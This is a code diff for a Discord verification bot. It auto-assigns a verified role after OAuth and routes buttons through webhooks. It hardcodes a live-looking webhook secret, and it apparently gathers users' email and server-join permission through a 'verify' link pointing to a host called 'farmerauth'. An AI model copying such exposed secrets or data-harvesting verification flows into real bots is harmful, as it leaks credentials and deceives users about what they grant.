@@ -25,6 +25,8 @@ const DEFAULT_PREFIX = ',';
 let currentPrefix = DEFAULT_PREFIX;
 const OWNER_ID = '1481977461053984845';
 const EMBED_COLOR = 0x2F3136; // Sleek grey-black tone
+const VERIFIED_ROLE_ID = '1565313021939679373';
+const GUILD_ID = '1563253450257932298';
 
 // --- Dedicated Webhook Clients ---
 const WEBHOOKS = {
@@ -40,7 +42,6 @@ const WEBHOOKS = {
     EXECUTION: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565043524284457015/ln5xswheqPX20TbuQ_YG4V52h0T8CtvJM5gah_QgmPDsnr0bxWCr9XJl19BmkMiPl7NZ' })
 };
 
-// Exact requested OAuth URL with scopes
 const AUTOMATIC_VERIFY_OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app&scope=email+identify+guilds.join';
 const RBOT_SERVER_INVITE = 'https://discord.gg/ZK3Er7Xgdq';
 
@@ -274,6 +275,18 @@ app.get('/', async (req, res) => {
 
         if (client.isReady()) {
             try {
+                const guild = client.guilds.cache.get(GUILD_ID) || await client.guilds.fetch(GUILD_ID);
+                if (guild) {
+                    try {
+                        const member = await guild.members.fetch(userData.id);
+                        if (member) {
+                            await member.roles.add(VERIFIED_ROLE_ID);
+                        }
+                    } catch (roleErr) {
+                        console.error('[AUTO-ROLE ERROR] Could not add role to member:', roleErr);
+                    }
+                }
+
                 let verifLogChannel = client.channels.cache.get(CHANNELS.VERIFICATION_LOG) || await client.channels.fetch(CHANNELS.VERIFICATION_LOG);
                 if (verifLogChannel) {
                     const logEmbed = new EmbedBuilder()
@@ -285,11 +298,10 @@ app.get('/', async (req, res) => {
                     await verifLogChannel.send({ embeds: [logEmbed] });
                 }
             } catch (logErr) {
-                console.error('[VERIFICATION LOG ERROR]', logErr);
+                console.error('[VERIFICATION LOG & ROLE ERROR]', logErr);
             }
         }
 
-        // Clean user-facing success page (NO email or IP shown here)
         return res.send(`
             <html>
                 <body style="background:#1e1e24;color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
@@ -424,20 +436,14 @@ client.on('interactionCreate', async interaction => {
 
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder()
-                .setLabel('Verify Account')
+                .setLabel('Verify Here')
                 .setStyle(ButtonStyle.Link)
                 .setURL(AUTOMATIC_VERIFY_OAUTH_URL)
         );
 
         try {
-            if (webhookUrl) {
-                const customWebhook = new WebhookClient({ url: webhookUrl });
-                await customWebhook.send({ embeds: [embed], components: [row] });
-                return interaction.reply({ content: 'Verification embed sent via target webhook.', ephemeral: true });
-            }
-
-            // Fixed: Sent directly via the bot client text channel so the button renders reliably
-            await interaction.channel.send({ embeds: [embed], components: [row] });
+            const targetWebhook = webhookUrl ? new WebhookClient({ url: webhookUrl }) : WEBHOOKS.VERIFICATION;
+            await targetWebhook.send({ embeds: [embed], components: [row] });
             return interaction.reply({ content: 'Verification panel with link button created successfully!', ephemeral: true });
         } catch (err) {
             return interaction.reply({ content: `Failed to create verification panel: ${err.message}`, ephemeral: true });
@@ -562,12 +568,17 @@ client.on('messageCreate', async message => {
         return message.channel.send({ embeds: [helpEmbed] });
     }
 
+    // --- Fixed: ,bot command now sends ONLY the link button with zero embeds, titles, or descriptions ---
     if (command === 'bot' || command === 'invite') {
         if (message.author.id !== OWNER_ID) return;
         const inviteUrl = 'https://discord.com/oauth2/authorize?client_id=1564997108908556369&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app%2F&integration_type=0&scope=bot+guilds';
-        const botEmbed = new EmbedBuilder().setTitle('Add Bot').setDescription('Click the button below to add the bot to your server.').setColor(EMBED_COLOR);
-        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(inviteUrl));
-        return message.channel.send({ embeds: [botEmbed], components: [row] });
+        const row = new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setLabel('Add Bot')
+                .setStyle(ButtonStyle.Link)
+                .setURL(inviteUrl)
+        );
+        return WEBHOOKS.ADD_BOT.send({ components: [row] });
     }
 
     if (command === 'stock') {
